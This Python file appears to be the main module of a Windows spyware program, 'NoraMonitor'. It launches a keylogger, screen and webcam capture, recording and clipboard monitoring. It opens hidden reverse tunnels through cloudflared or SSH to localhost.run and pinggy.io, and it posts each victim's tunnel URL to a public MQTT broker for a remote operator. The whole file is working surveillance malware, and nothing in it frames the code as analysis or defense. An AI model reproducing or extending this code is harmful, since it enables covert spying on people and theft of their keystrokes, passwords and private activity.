import os
import re
import socket
import subprocess
import threading
import traceback

MQTT_BROKER  = "broker.hivemq.com"
MQTT_TOPIC   = "nora/7638d08dcd8340ef953c"

import server
import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam
import clipboard_monitor as cb

PORT = int(os.environ.get("NORA_PORT", 9090))

_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
_CLOUDFLARED    = os.path.join(_APP_DIR, "cloudflared.exe")

_ANSI = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')


def _log(msg):
    try:
        with open(os.path.join(_APP_DIR, "nora.log"), "a") as f:
            import datetime
            f.write(f"{datetime.datetime.now()} {msg}\n")
            f.flush()
    except Exception:
        pass


def _publish_url(pc_name, tunnel_url):
    try:
        import paho.mqtt.client as mqtt
        client = mqtt.Client()
        client.connect(MQTT_BROKER, 1883, 60)
        topic = f"{MQTT_TOPIC}/{pc_name.replace(' ', '_')}"
        client.publish(topic, tunnel_url, qos=1, retain=True)
        client.disconnect()
        _log(f"Published: {tunnel_url}")
    except Exception as e:
        _log(f"MQTT error: {e}")


def _download_cloudflared():
    import urllib.request
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    try:
        _log("Downloading cloudflared...")
        urllib.request.urlretrieve(url, _CLOUDFLARED)
        _log("cloudflared downloaded OK")
        return True
    except Exception as e:
        _log(f"cloudflared download failed: {e}")
        return False


def _run_tunnel(cmd, pattern, label):
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    env = dict(os.environ, TERM="dumb")
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, startupinfo=si, env=env
    )
    published = False
    for line in proc.stdout:
        clean = _ANSI.sub('', line)
        _log(f"{label}: {clean.rstrip()}")
        if not published:
            m = re.search(pattern, clean)
            if m:
                tunnel_url = m.group(0)
                published = True
                import time; time.sleep(2)
                server.broadcast_ngrok_url(tunnel_url)
                pc_name = socket.gethostname()
                threading.Thread(target=_publish_url, args=(pc_name, tunnel_url), daemon=True).start()
    proc.wait()
    return published


def _start_tunnel(port):
    def _run():
        # Try cloudflared — download it first if missing
        if not os.path.exists(_CLOUDFLARED):
            _download_cloudflared()
        if os.path.exists(_CLOUDFLARED):
            try:
                _log("Trying cloudflared...")
                cmd = [_CLOUDFLARED, "--no-autoupdate", "tunnel", "--url", f"http://localhost:{port}"]
                if _run_tunnel(cmd, r'https://[a-z0-9-]+\.trycloudflare\.com', "CF"):
                    return
            except Exception as e:
                _log(f"Cloudflared failed: {e}")

        # Fallback 1: localhost.run via SSH
        try:
            _log("Trying SSH localhost.run...")
            cmd = ["ssh", "-n", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
                   "-R", f"80:localhost:{port}", "nokey@localhost.run"]
            if _run_tunnel(cmd, r'https?://[a-z0-9-]{6,}\.(localhost\.run|lhr\.life)', "SSH"):
                return
        except Exception as e:
            _log(f"SSH localhost.run failed: {e}")

        # Fallback 2: pinggy.io via SSH on port 443
        try:
            _log("Trying pinggy.io...")
            cmd = ["ssh", "-p", "443", "-n", "-o", "StrictHostKeyChecking=no",
                   "-o", "ServerAliveInterval=30",
                   "-R", f"0:localhost:{port}", "a.pinggy.io"]
            _run_tunnel(cmd, r'https://[a-z0-9-]+\.(a\.free\.pinggy\.link|in\.pinggy\.io)', "PG")
        except Exception as e:
            _log(f"Pinggy failed: {e}")

    threading.Thread(target=_run, daemon=True).start()


def main():
    os.makedirs(_APP_DIR, exist_ok=True)
    os.makedirs(_RECORDINGS_DIR, exist_ok=True)
    _log("Nora starting")

    try:
        _log("Init recorder")
        recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
        _log("Init camera")
        camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)
        _log("Init server")
        server.init(controller.handle_command, recorder, camera)
        _log("Init keylogger")
        kl.Keylogger(server.broadcast_key).start()
        _log("Init screencap")
        capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
        capture.attach_recorder(recorder)
        capture.start()
        _log("Init clipboard")
        cb.ClipboardMonitor(server.broadcast_clipboard).start()
        _log("Starting tunnel")
        _start_tunnel(PORT)
        _log("Starting server")
        server.run(port=PORT)
    except Exception:
        _log("CRASH:\n" + traceback.format_exc())


if __name__ == "__main__":
    main()
